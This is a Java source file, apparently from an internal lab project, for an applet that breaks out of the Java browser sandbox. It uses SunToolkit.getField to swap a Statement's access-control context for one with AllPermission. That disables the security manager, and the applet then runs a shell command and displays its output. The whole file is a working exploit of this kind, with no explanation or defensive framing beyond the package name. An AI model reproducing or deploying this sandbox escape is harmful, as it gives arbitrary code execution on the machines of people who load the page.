/*
 * Copyright 1999-2004 Alibaba.com All right reserved. This software is the confidential and proprietary information of
 * Alibaba.com ("Confidential Information"). You shall not disclose such Confidential Information and shall use it only
 * in accordance with the terms of the license agreement you entered into with Alibaba.com.
 */
package com.alibaba.stonelab.javalab.loophole;

import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.AccessControlContext;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

/**
 * @author <a href="mailto:li.jinl@alibaba-inc.com">tinyzen</a> 2013-8-15
 */
public class LoopholeApplet extends Applet {

    private static final long serialVersionUID = 1L;

    private String            ret;

    public void disableSecurity() throws Throwable {
        Statement localStatement = new Statement(System.class, "setSecurityManager", new Object[1]);
        Permissions localPermissions = new Permissions();
        localPermissions.add(new AllPermission());
        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"),
                                                                                     new Certificate[0]),
                                                                      localPermissions);
        AccessControlContext localAccessControlContext = new AccessControlContext(
                                                                                  new ProtectionDomain[] { localProtectionDomain });
        SetField(Statement.class, "acc", localStatement, localAccessControlContext);
        localStatement.execute();
    }

    private Class<?> GetClass(String paramString) throws Throwable {
        Object arrayOfObject[] = new Object[1];
        arrayOfObject[0] = paramString;
        Expression localExpression = new Expression(Class.class, "forName", arrayOfObject);
        localExpression.execute();
        return (Class<?>) localExpression.getValue();
    }

    private void SetField(Class<?> paramClass, String paramString, Object paramObject1, Object paramObject2)
                                                                                                            throws Throwable {
        Object arrayOfObject[] = new Object[2];
        arrayOfObject[0] = paramClass;
        arrayOfObject[1] = paramString;
        Expression localExpression = new Expression(GetClass("sun.awt.SunToolkit"), "getField", arrayOfObject);
        localExpression.execute();
        ((Field) localExpression.getValue()).set(paramObject1, paramObject2);
    }

    @Override
    public void init() {
        try {
            disableSecurity();
            String cmd = "ls -al";
            Process p = Runtime.getRuntime().exec(cmd);
            if (p != null) {
                p.waitFor();
            }
            byte[] val = new byte[1024 * 1024];
            int len = p.getInputStream().read(val);
            ret = new String(val, 0, len);
            System.out.println("cmd done. val is:" + ret);
        } catch (Throwable e) {
            System.out.println(e);
        }

    }

    @Override
    public void paint(Graphics g) {
        g.drawString("Loading...", 50, 50);
        g.drawString(ret, 50, 50);
    }

    public static void main(String[] args) throws Exception {
        new LoopholeApplet().init();
    }
}
